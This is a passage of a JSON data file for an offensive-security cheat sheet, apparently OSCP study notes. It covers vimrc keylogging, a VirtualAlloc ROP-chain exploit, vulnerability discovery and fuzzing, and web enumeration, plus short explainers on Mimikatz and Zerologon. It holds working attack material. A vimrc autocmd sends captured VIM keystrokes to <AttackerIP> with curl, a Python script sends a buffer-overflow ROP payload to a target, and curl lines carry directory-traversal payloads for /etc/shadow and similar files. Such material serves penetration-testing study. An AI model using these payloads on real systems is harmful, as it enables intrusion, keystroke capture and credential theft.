        "remote": true,
        "local": false
      },
      {
        "title": "Log to Remote Server",
        "codes": [
          {
            "lang": "bash",
            "code": "cat >> ~/.vimrc << 'EOF'\nautocmd VimLeave * if filereadable(\"/tmp/.vimbuf\") | silent !curl -X POST -d @/tmp/.vimbuf http://<AttackerIP>/log 2>/dev/null | endif\nEOF"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Log all keystrokes in VIM sessions.",
        "variant": "danger"
      }
    ]
  },
  {
    "category": "VirtualAlloc ROP Chain",
    "title": "VirtualAlloc ROP Chain",
    "tags": [
      "Binary_Exploitation",
      "Debugging",
      "Exploitation",
      "ROP",
      "WinDbg",
      "Windows"
    ],
    "steps": [
      {
        "title": "VirtualAlloc Prototype [Knowledge]",
        "codes": [
          {
            "lang": "c",
            "code": "LPVOID VirtualAlloc(\n    LPVOID lpAddress,        // Desired address (NULL = any)\n    SIZE_T dwSize,           // Size to allocate\n    DWORD  flAllocationType, // MEM_COMMIT | MEM_RESERVE (0x3000)\n    DWORD  flProtect         // PAGE_EXECUTE_READWRITE (0x40)\n);"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Function signature for VirtualAlloc call."
          }
        ]
      },
      {
        "title": "Find VirtualAlloc Address",
        "codes": [
          {
            "lang": "text",
            "code": "0:000> x kernel32!VirtualAlloc\n0:000> dps <ModuleBase>+<IATOffset>    ; Check IAT\n\n; Using mona\n!mona iat -m <Module>                   ; List IAT entries"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Locate VirtualAlloc in IAT or dynamically."
          }
        ]
      },
      {
        "title": "Mona ROP Chain Generation",
        "codes": [
          {
            "lang": "text",
            "code": "!mona rop -m <Module> -cpb \"\\x00\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Auto-generate VirtualAlloc chain."
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "Creates rop_chains.txt with Python/Ruby/JavaScript payloads."
          }
        ]
      },
      {
        "title": "Manual Chain Strategy [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Steps to build VirtualAlloc ROP chain:\n1. Set up stack with VirtualAlloc arguments\n2. Call VirtualAlloc (returns RWX memory address in EAX)\n3. Copy shellcode to allocated memory\n4. Jump to shellcode",
            "variant": "info"
          },
          {
            "type": "note",
            "content": "**Alternative (PUSHAD method)**:\n1. Set registers: EAX=NOP, ECX=flProtect, EDX=flAllocationType, EBX=dwSize, EBP=ReturnAddr, ESI=VirtualAlloc, EDI=ROP NOP\n2. PUSHAD creates stack frame\n3. Call VirtualAlloc via ESI",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "PUSHAD Stack Frame [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "PUSHAD pushes in order: EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI\n\nAfter PUSHAD, stack looks like:\n+------------------+\n| EDI              | <-- ESP (return to ROP NOP sled)\n+------------------+\n| ESI              |     (VirtualAlloc address)\n+------------------+\n| EBP              |     (return addr after VirtualAlloc)\n+------------------+\n| ESP (original)   |     (lpAddress - use stack address)\n+------------------+\n| EBX              |     (dwSize)\n+------------------+\n| EDX              |     (flAllocationType - 0x3000)\n+------------------+\n| ECX              |     (flProtect - 0x40)\n+------------------+\n| EAX              |     (NOP padding)\n+------------------+"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "How PUSHAD arranges registers on stack."
          }
        ]
      },
      {
        "title": "Build PUSHAD-Based Chain",
        "codes": [
          {
            "lang": "python",
            "code": "import struct\n\ndef p32(addr):\n    return struct.pack(\"<I\", addr)\n\n# Gadget addresses (adjust for target)\nPOP_EAX = 0x10001000\nPOP_ECX = 0x10001004\nPOP_EDX = 0x10001008\nPOP_EBX = 0x1000100c\nPOP_EBP = 0x10001010\nPOP_ESI = 0x10001014\nPOP_EDI = 0x10001018\nPUSHAD = 0x1000101c\nVIRTUALALLOC_IAT = 0x10002000  # Pointer to VirtualAlloc\nMOV_EAX_DWORD_EAX = 0x10001020  # mov eax, [eax]; ret\n\n# Build ROP chain\nrop = b\"\"\n\n# EAX = NOP (will be at bottom of PUSHAD frame)\nrop += p32(POP_EAX)\nrop += p32(0x90909090)\n\n# ECX = flProtect (0x40 = PAGE_EXECUTE_READWRITE)\nrop += p32(POP_ECX)\nrop += p32(0x00000040)\n\n# EDX = flAllocationType (0x3000 = MEM_COMMIT | MEM_RESERVE)\nrop += p32(POP_EDX)\nrop += p32(0x00003000)\n\n# EBX = dwSize (0x1000 = 4096 bytes)\nrop += p32(POP_EBX)\nrop += p32(0x00001000)\n\n# EBP = return address (points to shellcode after VirtualAlloc)\nrop += p32(POP_EBP)\nrop += p32(0x41414141)  # Placeholder - adjust at runtime\n\n# ESI = VirtualAlloc address (dereference IAT)\nrop += p32(POP_EAX)\nrop += p32(VIRTUALALLOC_IAT)\nrop += p32(MOV_EAX_DWORD_EAX)  # EAX = [VirtualAlloc]\n# Need gadget to move EAX to ESI\n\n# EDI = ROP NOP (ret gadget for slide)\nrop += p32(POP_EDI)\nrop += p32(0x10001024)  # Simple RET gadget\n\n# Execute PUSHAD and call\nrop += p32(PUSHAD)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "ROP chain using PUSHAD technique."
          }
        ]
      },
      {
        "title": "Handle NULL Bytes in Parameters",
        "codes": [
          {
            "lang": "python",
            "code": "# 0x40 contains NULLs - build via arithmetic\n# Use: 0xFFFFFFBF + 0x00000081 = 0x100000040 (truncated to 0x40)\nrop += p32(POP_EAX)\nrop += p32(0xFFFFFFBF)  # -65 (no NULLs)\nrop += p32(POP_ECX)\nrop += p32(0x01010181)  # Will add to EAX\nrop += p32(ADD_EAX_ECX)\n# EAX now contains 0x40\n\n# Or use NEG:\nrop += p32(POP_EAX)\nrop += p32(0xFFFFFFBF)  # -65 in two's complement\nrop += p32(NEG_EAX)\n# Need to add 1 if using NEG for 0x40"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Build values without NULL bytes."
          }
        ]
      },
      {
        "title": "Calculate Return Address",
        "codes": [
          {
            "lang": "text",
            "code": "; After VirtualAlloc returns:\n; - EAX contains address of allocated RWX memory\n; - Need to copy shellcode there\n; - Or: use stack address as lpAddress, shellcode already there\n\nStrategy 1: Allocate at NULL (any address)\n- VirtualAlloc returns address in EAX\n- Copy shellcode to EAX\n- JMP EAX\n\nStrategy 2: Allocate at stack\n- lpAddress = ESP at time of call\n- Stack becomes executable\n- Return directly to shellcode on stack"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Determine where shellcode lands."
          }
        ]
      },
      {
        "title": "Stack-Based VirtualAlloc Chain",
        "codes": [
          {
            "lang": "python",
            "code": "# Simpler approach: make current stack executable\n# lpAddress = current ESP value\n\nrop = b\"\"\n\n# Get current ESP into a register\n# Need creative gadget use since we can't directly read ESP\n\n# Alternative: Use VirtualProtect instead\n# Changes existing memory permissions"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Make stack executable, jump to shellcode."
          }
        ]
      },
      {
        "title": "Complete Exploit Structure",
        "codes": [
          {
            "lang": "python",
            "code": "import struct\nimport socket\n\ndef p32(addr):\n    return struct.pack(\"<I\", addr)\n\n# Gadgets (from target binary)\nGADGETS = {\n    'pop_eax': 0x10001000,\n    'pop_ecx': 0x10001004,\n    'pop_edx': 0x10001008,\n    'pop_ebx': 0x1000100c,\n    'pop_ebp': 0x10001010,\n    'pop_esi': 0x10001014,\n    'pop_edi': 0x10001018,\n    'pushad': 0x1000101c,\n    'ret': 0x10001024,\n}\n\nVIRTUALALLOC = 0x10002000\n\n# Shellcode\nshellcode = b\"\\xcc\" * 100  # INT3 for testing\n\n# Build ROP chain\ndef build_rop():\n    rop = b\"\"\n    # ... (add gadgets as above)\n    return rop\n\n# Build exploit\noffset = 260  # Offset to EIP\nbuffer = b\"A\" * offset\nbuffer += build_rop()\nbuffer += b\"\\x90\" * 16  # NOP sled\nbuffer += shellcode\n\n# Send exploit\ns = socket.socket()\ns.connect((\"<TargetIP>\", <Port>))\ns.send(buffer)\ns.close()"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Full exploit with ROP chain."
          }
        ]
      },
      {
        "title": "Debug ROP Chain",
        "codes": [
          {
            "lang": "text",
            "code": "0:000> bp <FirstGadget>\n0:000> g\n0:000> p                    ; Step through each gadget\n0:000> r                    ; Verify register values\n0:000> dd esp L10           ; Check stack layout"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Verify chain execution step by step."
          }
        ]
      },
      {
        "title": "Common Issues [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Troubleshooting ROP chains:\n- **Chain breaks early**: Gadget has unexpected side effects, corrupts stack\n- **Wrong values in registers**: Gadget order incorrect, extra POPs\n- **Access violation**: Bad gadget address, address contains NULLs\n- **VirtualAlloc fails**: Invalid parameters, check return value",
            "variant": "warning"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Microsoft VirtualAlloc",
        "url": "https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Build ROP chain to call VirtualAlloc and execute shellcode."
      }
    ]
  },
  {
    "category": "Vulnerability Discovery",
    "title": "Vulnerability Discovery",
    "tags": [
      "Binary_Exploitation",
      "Debugging",
      "Exploitation",
      "Reverse_Engineering",
      "Windows"
    ],
    "steps": [
      {
        "title": "Static Analysis Approach",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Analyze code without execution:\n1. Load binary in **IDA Pro**\n2. Identify dangerous function imports\n3. Cross-reference to find callers\n4. Trace data flow from input to dangerous function\n5. Determine if input is controllable and unchecked",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Find Buffer Overflow Candidates",
        "codes": [
          {
            "lang": "text",
            "code": "; Look for these imports:\nstrcpy, strcat, sprintf, vsprintf\nmemcpy with non-constant size\ngets (always vulnerable)\n\n; In each caller, check:\n- Is destination buffer fixed size?\n- Is source/size attacker-controlled?\n- Are bounds checked before call?"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Search for vulnerable patterns in IDA."
          }
        ]
      },
      {
        "title": "Analyze memcpy Calls",
        "codes": [
          {
            "lang": "text",
            "code": "; In IDA, at memcpy call:\n- Check third argument (size)\n- Trace back to see where size comes from\n- If size comes from packet, potential overflow\n- Compare with destination buffer size"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Examine size parameter for overflows."
          }
        ]
      },
      {
        "title": "Identify Integer Overflows",
        "codes": [
          {
            "lang": "text",
            "code": "; Look for patterns:\nsize = user_length + header_size    ; May overflow to small value\nbuffer = malloc(size)                ; Small allocation\nmemcpy(buffer, data, user_length)    ; Overflow!"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Find arithmetic that affects buffer sizes."
          }
        ]
      },
      {
        "title": "Dynamic Fuzzing Approach",
        "codes": [
          {
            "lang": "python",
            "code": "import socket\n\ndef fuzz(host, port, base_packet, offset, max_size):\n    \"\"\"Simple fuzzer that grows a field\"\"\"\n    for size in range(100, max_size, 100):\n        payload = base_packet[:offset]\n        payload += b\"A\" * size\n        payload += base_packet[offset:]\n\n        try:\n            s = socket.socket()\n            s.settimeout(5)\n            s.connect((host, port))\n            s.send(payload)\n            response = s.recv(1024)\n            s.close()\n            print(f\"Size {size}: OK\")\n        except Exception as e:\n            print(f\"Size {size}: {e} - POSSIBLE CRASH\")\n            break"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Test with malformed input."
          }
        ]
      },
      {
        "title": "Monitor for Crashes",
        "codes": [
          {
            "lang": "text",
            "code": "; Configure WinDbg to catch all exceptions\n0:000> sxe av                  ; Access violations\n0:000> sxe c0000005            ; Explicit AV code\n0:000> g                       ; Run and wait for crash"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Attach debugger to catch exceptions."
          }
        ]
      },
      {
        "title": "Analyze Crash for Exploitability",
        "codes": [
          {
            "lang": "text",
            "code": "0:000> !analyze -v              ; Detailed crash analysis\n0:000> r                        ; Check register values\n0:000> !exchain                 ; Check SEH chain\n0:000> db eip L10              ; Check what EIP points to"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Determine if crash is exploitable."
          }
        ]
      },
      {
        "title": "Exploitable Crash Indicators [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Signs that a crash may be exploitable:\n- **EIP overwritten**: Direct code execution control\n- **SEH overwritten**: SEH exploitation possible\n- **EAX/ECX points to controlled data**: Potential for write-what-where\n- **Access violation on write**: May control write destination\n- **Heap corruption**: Potential heap exploitation",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Root Cause Analysis",
        "codes": [
          {
            "lang": "text",
            "code": "1. Set breakpoint at vulnerable function\n2. Examine call stack: kb\n3. Examine parameters at crash\n4. Trace backward to find:\n   - Where did bad data come from?\n   - What check was missing?\n   - What assumption was violated?"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Understand why vulnerability exists."
          }
        ]
      },
      {
        "title": "Document Vulnerability",
        "codes": [
          {
            "lang": "text",
            "code": "Vulnerability: Stack Buffer Overflow\nLocation: sub_401000 + 0x150\nTrigger: Opcode 0x02 with data > 256 bytes\nRoot Cause: memcpy uses attacker-supplied length\nImpact: EIP control at offset 260\nBad Characters: 0x00, 0x0a, 0x0d"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Record findings for exploit development."
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Fuzzing Book",
        "url": "https://www.fuzzingbook.org/"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Techniques for finding exploitable vulnerabilities through reverse engineering."
      }
    ]
  },
  {
    "category": "Vulnerability Scanning Theory",
    "title": "Vulnerability Scanning Concepts",
    "tags": [
      "Discovery",
      "Reconnaissance"
    ],
    "steps": [
      {
        "title": "Key Terms",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Key vulnerability scanning terms:\n- **CVE** - Common Vulnerabilities and Exposures, unique identifier for vulnerabilities\n- **CVSS** - Common Vulnerability Scoring System, severity rating 0-10\n- **False Positive** - Vulnerability detected but target is not actually vulnerable\n- **False Negative** - Vulnerability exists but scanner missed it",
            "variant": "important"
          }
        ]
      },
      {
        "title": "CVSS v3.0 Severity Ratings",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "CVSS severity levels:\n- **None**: 0.0\n- **Low**: 0.1-3.9\n- **Medium**: 4.0-6.9\n- **High**: 7.0-8.9\n- **Critical**: 9.0-10.0"
          }
        ]
      },
      {
        "title": "Scan Types by Location",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Scan types based on network position:\n- **External** - Targets accessible from internet (web apps, DMZ, public services)\n- **Internal** - Direct access to internal network (VPN or on-site)"
          }
        ]
      },
      {
        "title": "Scan Types by Authentication",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Scan types based on credentials:\n- **Unauthenticated** - No credentials, finds remotely accessible vulnerabilities only\n- **Authenticated** - Uses valid credentials, finds local security flaws, missing patches, misconfigs. Provides much better visibility but requires privileged credentials"
          }
        ]
      },
      {
        "title": "Scan Considerations",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Important scan considerations:\n- **Duration** - External scans over internet are slower due to network hops. Plan accordingly for large IP lists\n- **Target Visibility** - Consider firewalls, IPS, VPNs, and access restrictions. ICMP may be blocked causing hosts to appear offline. Rate limiting can cause missed hosts/services\n- **Network Impact** - Vulnerability scans generate heavy traffic. Can render networks unusable or crash unstable services. Reduce parallel scans or scanning speed if needed",
            "variant": "warning"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "HackTricks - Vulnerability Assessment",
        "url": "https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-methodology.html"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Automated scanners follow this workflow:\n1. Host Discovery\n2. Port Scanning\n3. OS/Service/Version Detection\n4. Match results to vulnerability database (NVD, CVE)",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Web Application Enumeration",
    "title": "Web Application Enumeration",
    "tags": [
      "Discovery",
      "Exploitation",
      "HTTP",
      "Reconnaissance",
      "Web_Application"
    ],
    "steps": [
      {
        "title": "Nmap Service Detection",
        "codes": [
          {
            "lang": "bash",
            "code": "nmap -p <Port> -sV <Target>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Nmap HTTP Enumeration Script",
        "codes": [
          {
            "lang": "bash",
            "code": "nmap -p <Port> --script=http-enum <Target>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Performs initial fingerprinting, discovers directories, login pages, and interesting files using **Nmap** NSE scripts."
          }
        ]
      },
      {
        "title": "Wappalyzer Technology Lookup",
        "codes": [
          {
            "lang": "bash",
            "code": "https://www.wappalyzer.com/lookup/<Domain>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Passive technology stack identification using **Wappalyzer**. Reveals OS, frameworks, JavaScript libraries, and web server."
          }
        ]
      },
      {
        "title": "Directory Brute Forcing with Gobuster",
        "substeps": [
          {
            "title": "Basic Directory Scan",
            "codes": [
              {
                "lang": "bash",
                "code": "gobuster dir -u http://<Target> -w /usr/share/wordlists/dirb/common.txt"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Reduce Threads",
            "codes": [
              {
                "lang": "bash",
                "code": "gobuster dir -u http://<Target> -w /usr/share/wordlists/dirb/common.txt -t 5"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Common Wordlists",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Common wordlists:\n- **/usr/share/wordlists/dirb/common.txt** - Common directories and files\n- **/usr/share/wordlists/dirb/big.txt** - Larger wordlist for thorough enumeration\n- **/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt** - Medium-sized comprehensive list",
                "variant": "tip"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "**Gobuster** generates significant traffic - not stealthy. Use smaller wordlists and fewer threads (**-t**) to reduce noise.",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "Check robots.txt",
        "codes": [
          {
            "lang": "bash",
            "code": "curl http://<Target>/robots.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Contains **Allow/Disallow** directives for web crawlers. May reveal sensitive directories."
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "Nmap's `http-robots.txt` script can miss data - always check manually.",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "Check sitemap.xml",
        "codes": [
          {
            "lang": "bash",
            "code": "curl http://<Target>/sitemap.xml"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Check for .git Directory",
        "codes": [
          {
            "lang": "bash",
            "code": "# Manual check\ncurl http://<Target>/.git/\n\n# Check for common .git files\ncurl http://<Target>/.git/config\ncurl http://<Target>/.git/HEAD"
          },
          {
            "lang": "bash",
            "code": "git-dumper http://<Target>/.git/ ./output\ncd output\ngit log\ngit show <commit-id>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Dirbuster and most wordlists do NOT check for `.git` folders.",
            "variant": "warning"
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "Look for credentials in commit history, config files, and old code.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Check PHPInfo Pages",
        "codes": [
          {
            "lang": "bash",
            "code": "# Common PHPInfo locations\ncurl http://<Target>/phpinfo.php\ncurl http://<Target>/info.php\ncurl http://<Target>/test.php\ncurl http://<Target>/php.php"
          },
          {
            "lang": "text",
            "code": "DOCUMENT_ROOT: /var/www/html\nSCRIPT_FILENAME: /var/www/html/phpinfo.php"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "PHPInfo pages reveal absolute file paths for webshell uploads.",
            "variant": "tip"
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "Use these paths to determine where uploaded files are stored.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Inspect Response Headers",
        "codes": [
          {
            "lang": "bash",
            "code": "curl -I http://<Target>"
          },
          {
            "lang": "bash",
            "code": "nikto -h http://<Target>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Look for **Server**, **X-Powered-By**, **X-Aspnet-Version**, and other headers revealing technology stack.",
            "variant": "tip"
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "Nikto checks for interesting response headers, missing security headers, and server versions.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "WordPress Enumeration with WPScan",
        "codes": [
          {
            "lang": "bash",
            "code": "wpscan -e p --plugins-detection aggressive --detection-mode aggressive --url http://<Target>"
          },
          {
            "lang": "bash",
            "code": "wpscan --url http://<Target> -e u"
          },
          {
            "lang": "bash",
            "code": "wpscan --url http://<Target> -U users.txt -P /usr/share/wordlists/rockyou.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Use aggressive mode for maximum coverage - passive mode misses vulnerabilities.",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Directory Traversal Test Files",
        "codes": [
          {
            "lang": "bash",
            "code": "# Test for directory traversal\ncurl http://<Target>/download?file=../../../../../../../Windows/System32/drivers/etc/hosts\ncurl http://<Target>/download?file=../../../../../../../inetpub/wwwroot/web.config"
          },
          {
            "lang": "bash",
            "code": "# Test for directory traversal\ncurl http://<Target>/download?file=../../../../../../../etc/passwd\ncurl http://<Target>/download?file=../../../../../../../etc/shadow"
          },
          {
            "lang": "bash",
            "code": "# Try URL-encoded paths\ncurl http://<Target>/download?file=..%2f..%2f..%2f..%2f..%2fetc%2fpasswd\ncurl http://<Target>/download?file=....//....//....//....//etc/passwd"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "If you suspect directory traversal, test these common files.",
            "variant": "tip"
          },
          {
            "type": "text",
            "content": "**Windows:**"
          }
        ]
      },
      {
        "title": "Recursive File Search",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-ChildItem -Path C: -Include *.ps1,*.txt,*.exe,*.log,*.ini,*.kdbx,*.pdf,*.xls,*.xlsx -Recurse -ErrorAction SilentlyContinue"
          },
          {
            "lang": "bash",
            "code": "find / -type f \\( -iname \\*.txt\\* -o -iname \\*.log\\* -o -iname \\*.ps1\\* -o -iname \\*.exe\\* \\) 2>/dev/null"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Find interesting files that could contain credentials.",
            "variant": "tip"
          },
          {
            "type": "text",
            "content": "**PowerShell (Windows):**"
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "Look for credentials in `.txt`, `.log`, `.ini`, `.kdbx`, and `.ps1` files.",
            "variant": "info"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "HackTricks - Web Pentesting",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/index.html"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Start web app enumeration from the web server. Identify server software, version, and technology stack before testing the application.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Security Headers Scanning",
    "title": "What are Security Headers?",
    "tags": [
      "Reconnaissance",
      "Security_Headers",
      "Web_Application"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Security headers are HTTP response headers that instruct browsers how to behave when handling content.\n- Prevent common web attacks (XSS, clickjacking, MIME sniffing)\n- Enforce secure communication (HTTPS, CSP)\n- Missing or misconfigured headers indicate security weaknesses\n- Can reveal information about the application stack",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Shadow Copies Extraction",
    "title": "What are Shadow Copies?",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "NTDS",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Volume Shadow Copy Service (VSS) creates point-in-time snapshots of volumes.\n- Used for backup and restore operations\n- Often contains copies of sensitive files (NTDS.dit, SAM, SYSTEM)\n- Requires local administrator privileges to access\n- Can be used to extract credentials even if files are locked",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Tunneling with Chisel",
    "title": "What is Chisel?",
    "tags": [
      "Lateral_Movement",
      "Linux",
      "Pivoting",
      "Tunneling",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Chisel is a TCP/UDP tunnel transported over HTTP and secured via SSH.\n- Single executable (no dependencies)\n- Works on Windows, Linux, macOS\n- Supports reverse and forward tunneling\n- Easier than SSH tunneling for Windows targets\n- Perfect for OSCP dual-homed machines",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Invoke-RunasCs",
    "title": "What is Invoke-RunasCs?",
    "tags": [
      "Lateral_Movement",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Invoke-RunasCs allows you to run commands as a different user on Windows.\n- PowerShell implementation of RunasCs\n- Works when you have credentials but can't use RDP/WinRM\n- Bypasses some restrictions of built-in `runas` command\n- Useful for privilege escalation and lateral movement",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Mimikatz",
    "title": "What is Mimikatz?",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Mimikatz",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Mimikatz is a post-exploitation tool for extracting credentials from Windows systems.\n- Dumps plaintext passwords, hashes, and Kerberos tickets from memory\n- Performs pass-the-hash, pass-the-ticket, and golden/silver ticket attacks\n- Manipulates Windows authentication mechanisms\n- Requires administrator or SYSTEM privileges for most operations",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Zerologon",
    "title": "What is Zerologon?",
    "tags": [
      "Active_Directory",
      "CVE-2020-1472",
      "Domain_Controller",
      "Exploitation"
    ],
    "steps": [
      {
        "title": "How It Works",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "The vulnerability exploits a cryptographic flaw in Netlogon authentication:\n1. Netlogon uses AES-CFB8 encryption with an all-zero IV\n2. Attacker sends authentication requests with all-zero challenge\n3. 1 in 256 chance the server accepts the authentication\n4. After ~256 attempts, attacker authenticates as the DC computer account\n5. Attacker resets DC computer account password to empty string\n6. Attacker uses empty password to perform DCSync and dump domain credentials",
            "variant": "info"
          }
        ]
      }
    ],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "CVE-2020-1472 is a critical vulnerability in the Netlogon Remote Protocol (MS-NRPC).\n- Allows unauthenticated attackers to reset the domain controller computer account password\n- Grants instant Domain Admin privileges\n- Affects all Windows Server versions (2008 R2 through 2019)\n- Patched in August 2020, but many systems remain vulnerable",
        "variant": "warning"
      }
    ]
  },
  {
    "category": "TTY Shell Stabilization",
    "title": "Why Stabilize Shells?",
    "tags": [],
    "steps": [
      {
        "title": "Problems with Basic Shells",
        "codes": [
          {
            "lang": "plaintext",
